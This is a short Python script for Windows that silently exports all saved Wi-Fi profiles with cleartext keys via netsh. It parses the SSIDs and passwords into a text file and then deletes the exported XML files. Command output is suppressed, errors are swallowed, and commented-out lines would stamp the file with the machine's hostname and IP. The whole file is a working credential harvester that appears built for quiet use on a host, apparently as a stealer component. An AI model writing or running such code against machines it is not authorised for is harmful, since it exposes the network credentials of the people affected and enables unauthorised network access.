import subprocess
import os
#import socket


class WifiPasswords:
    def __init__(self):
        #self.password_file = open("wifi.txt", "w", encoding="utf-8")
        #self.password_file.write(f"Password List for: {socket.gethostname()}, {socket.gethostbyname(socket.gethostname())}: \n")
        #self.password_file.close()

        self.files = []
        self.ssid = []
        self.password = []

        #subprocess.run("netsh wlan export profile key=clear", capture_output=True).stdout.decode()
        subprocess.run("netsh wlan export profile key=clear", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
        self.path = os.getcwd()

    def get_files(self):
        for file_name in os.listdir(self.path):
            if file_name.startswith("Wi-Fi") and file_name.endswith(".xml"):
                self.files.append(file_name)

    def write(self):
        with open("wifi.txt", "a", encoding="utf-8") as file:
            written_ssid = set()
            for i in self.files:
                with open(i, "r") as f:
                    for line in f.readlines():
                        if "name" in line:
                            stripped = line.strip()
                            front = stripped[6:]
                            back = front[:-7]
                            if back not in written_ssid:
                                self.ssid.append(back)
                        if "keyMaterial" in line:
                            stripped = line.strip()
                            front = stripped[13:]
                            back = front[:-14]
                            if self.ssid and back and self.ssid[-1] not in written_ssid:
                                written_ssid.add(self.ssid[-1])
                                self.password.append(back)
                                file.write(f"SSID: {self.ssid[-1]} Password: {self.password[-1]}\n")
                try:
                    os.remove(i)
                except:
                    pass

    def run(self):
        try:
            self.get_files()
            self.write()
        except:
            pass


#wifi = WifiPasswords()
#wifi.run()
